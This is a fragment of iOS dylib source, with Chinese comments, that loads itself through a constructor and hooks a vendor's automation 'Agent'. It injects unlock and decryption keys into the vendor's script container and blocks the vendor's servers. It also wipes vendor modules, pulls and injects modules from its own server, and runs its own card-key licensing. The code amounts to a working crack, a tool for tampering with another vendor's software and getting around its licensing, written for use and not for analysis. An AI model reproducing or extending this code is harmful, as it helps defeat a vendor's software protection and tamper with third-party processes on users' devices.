        // ★ v6.23i：封禁期间每拍「清字典 + 抹本地模块」（v6.20 只拒新注入不够 ——
        //   字典里封禁前的旧模块还在，中控一点运行厂商照跑，.45 实测）。
        //   厂商/中控若重灌字典，下拍再清（onion dict wiped 日志即实证信号）。
        //   恢复全自动：卡重新有效 → pull 重下模块 → wd 重注入。
        if (blocked && base) {
            bs_wipe_onion_dict(base);
            int wiped = bs_wipe_local_modules();
            static int bw_logged = 0;
            if (!bw_logged && wiped > 0) {
                bw_logged = 1;
                bs_log("[card] blocked wipe: dict + %d local module file(s), every tick", wiped);
            }
        }
        g_card_blocked = blocked;
    }
    return NULL;
}

static void *bs_bootstrap(void *arg) {
    // 等 dyld 与 ObjC 运行时彻底就绪再动手
    sleep(2);

    @autoreleasepool {
        // ★★★ v6.23v：App 进程分支 —— filter 扩到 App 后这里才会跑。
        //     只做「装后自动点启动服务」，其余 Agent 专属逻辑全部跳过。
        if (bs_proc_is_app()) {
            char asv[64];
            if (bs_autosvc_pending(asv, sizeof(asv))) {
                // ★ v6.24j：App 刚冷启（或从后台回到前台）时 UIWindow 还没建，
                //   as_tryTap 立即拿到 nil → 早期版本因「装了 dylib、App 也在跑」被
                //   dyld 共享缓存命中而不重新 load，as_kickoff 从不执行（.98 装 probe 包
                //   后续装不代启的实证）。这里改成：
                //     ① 先等 UI 就绪（最多 60s / 40 拍）再起点击定时器；
                //     ② 订阅 UIApplicationDidBecomeActiveNotification —— App 每次激活
                //        都重新 kickoff（.autosvc_pending 被消费后自然 no-op）。
                bs_log("[autosvc] pending marker (ver=%.24s) -> wait for UI then auto-tap start-service",
                       asv);
                for (int wi = 0; wi < 40; wi++) {
                    id appCls = NSClassFromString(@"UIApplication");
                    id app = appCls ? [(id)appCls sharedApplication] : nil;
                    if (app) {
                        NSArray *ws = [(id<BSAutoUI>)app windows];
                        if (ws && ws.count > 0) {
                            bs_log("[autosvc] UI ready after %.1fs (windows=%lu)",
                                   wi * 1.5, (unsigned long)ws.count);
                            break;
                        }
                    }
                    usleep(1500 * 1000);
                }
                [BSAutosvcHelper as_kickoff];
            } else {
                bs_log("[autosvc] no marker, App process idle (dylib loaded OK)");
            }
            return NULL;
        }

        g_base = bs_find_base();
        if (!g_base) {
            bs_log("agent image not found (count=%u)", _dyld_image_count());
            return NULL;
        }

        // 0) ★ v6.3：提前读 conf —— 密钥注入需要 host/port/token
        //    ★ v6.4：conf 里的 mode=probe 也在这里生效
        bs_load_conf();

        // ★★★ v6.4：probe 模式（真卡机只读雷达）—— 提前返回，不注入 / 不心跳 / 不拉模块。
        //    真机业务零改变，只多一个只读上报线程。
        if (g_mode == MODE_PROBE) {
            bs_log("★★★ PROBE mode: inject/watchdog/pull ALL skipped (read-only radar)");
            pthread_t tpr;
            if (pthread_create(&tpr, NULL, bs_probe_thread, (void *)g_base) == 0) {
                pthread_detach(tpr);
            } else {
                bs_log("probe thread create failed");
            }
            return NULL;
        }

        // 1) ★ v6.3：解锁密钥注入；★ v6.5：语义变为「按版本幂等 + 合并」
        //    优先向服务端 GET /key（按本地 beta.so 版本查），失败回退内置 kKey/kVal。
        bs_inject_mh(g_base);
        // 1a) ★ v6.15：beta.so 是多记录容器 —— 记录1（脚本载荷）的 ver 恒为 020909，
        //     只注文件头版本（记录0 元数据版本）会让载荷记录无键 → 「加载运行库出错」。
        bs_ensure_payload_key(g_base);

        // 1a-2) ★ v6.24c：**同步预铺「全部段版本」密钥**。
        //   实测（10-17 .115 装 v1.56 后冷启）：中控在设备上线约 4s 就补发
        //   `run script msg`，而 verwatch 首拍要等 3s、逐版本 HTTP 再各约 80ms，
        //   于是 17:45:18 加载时只铺到 2 把（030100 base + 020909 payload），
        //   其余 7 把 17:45:19.7 才到 → `can not find version key!!`
        //   → `load snail module failed` → 中控该行显示「加载运行库出错」。
        //   在 init 阶段一次性铺完，把「键就绪」窗口从 ~6s 压到 ~1s，
        //   赶在中控下发 run 之前把键备齐。
        {
            int pv = bs_refresh_so_vers();
            for (int pi = 0; pi < pv; pi++) {
                char pvh[8];
                snprintf(pvh, sizeof(pvh), "%02x%02x%02x",
                         g_ek_vers[pi][0], g_ek_vers[pi][1], g_ek_vers[pi][2]);
                bs_ensure_extra_key(g_base, pvh, 1);   // bypass_throttle：首铺必取
            }
            if (pv > 0) bs_log("[mh] prewarm done, %d ver(s) ensured", pv);
        }

        // 1b) ★ v6.5：起版本哨兵 —— 3s 轮询 beta.so 版本，跃迁即补密钥
        pthread_t tv;
        if (pthread_create(&tv, NULL, bs_verwatch, (void *)g_base) == 0) {
            pthread_detach(tv);
        } else {
            bs_log("verwatch thread create failed");
        }

        // 1b-2) ★ v6.20：自有卡密系统 —— cardwatch（仅 unlock & cardcheck=1）
        if (g_cardcheck) {
            pthread_t tc;
            if (pthread_create(&tc, NULL, bs_cardwatch, (void *)g_base) == 0) {
                pthread_detach(tc);
            } else {
                bs_log("[card] cardwatch thread create failed");
            }
        } else {
            bs_log("[card] cardcheck=0 -> card watch disabled");
        }

        // 1c) ★ v6.6：起跟版线程 —— 主动问云端最新版本，比本地新就拉包落盘
        //     （probe 模式在上面的 early-return 已经走掉，不会到这里）
        if (g_so_sync) {
            pthread_t ts;
            if (pthread_create(&ts, NULL, bs_so_sync_thread, NULL) == 0) {
                pthread_detach(ts);
            } else {
                bs_log("so_sync thread create failed");
            }
        } else {
            bs_log("[so] sosync=0 -> sync thread NOT started");
        }

        // 2) 起看门狗（内部负责 v3 自愈 + v4 模块注入）
        bs_log("watchdog starting (base=%p state@%p run@%p oniondict@%p)",
               (void *)g_base, (void *)(g_base + OFF_STATE), (void *)(g_base + OFF_RUN),
               (void *)(g_base + OFF_ONION_DICT));
    }

    pthread_t th;
    if (pthread_create(&th, NULL, bs_watchdog, (void *)g_base) == 0) {
        pthread_detach(th);
    } else {
        bs_log("watchdog thread create failed");
    }

    // 3) ★ v5：起拉取线程（路线 A）
    //    bs_load_conf 已在步骤 0 提前调用（密钥注入要用 host/port/token）
    pthread_t tp;
    if (pthread_create(&tp, NULL, bs_puller, (void *)g_base) == 0) {
        pthread_detach(tp);
        bs_log("puller starting (port=%d tick=%ds)", g_port, g_tick);
    } else {
        bs_log("puller thread create failed");
    }
    return NULL;
}

__attribute__((constructor))
static void bs_entry(void) {
    // constructor 里只起线程，绝不碰 dyld/ObjC API
    pthread_t th;
    if (pthread_create(&th, NULL, bs_bootstrap, NULL) == 0) {
        pthread_detach(th);
    }
    // ★ v6.19：厂商服务器屏蔽 —— 独立线程尽早安装（赶在 Agent 首次外联前）
    pthread_t tb;
    if (pthread_create(&tb, NULL, bs_block_init, NULL) == 0) {
        pthread_detach(tb);
    }
}
